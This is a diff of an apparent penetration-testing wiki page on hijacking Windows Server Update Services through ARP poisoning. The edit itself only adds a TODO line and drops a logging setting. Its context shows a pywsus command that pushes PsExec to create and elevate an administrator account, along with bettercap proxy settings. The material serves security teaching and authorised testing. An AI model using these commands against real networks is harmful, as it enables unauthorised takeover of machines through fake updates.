@@ -30,6 +30,8 @@ The evil WSUS server needs to be started before doing any ARP poisoning. The [py
 python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
 ```
 
+//TODO : lolbas
+
 ### Poisoning and hijacking
 
 Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) \(Go\) and for the majority of the scenarios, basic knowledge of the iptables utility is required.
@@ -57,7 +59,6 @@ set any.proxy.dst_port 8530
 # control logging and verbosity
 events.ignore endpoint
 events.ignore net.sniff
-events.include net.sniff.http
 
 # start the modules
 any.proxy on
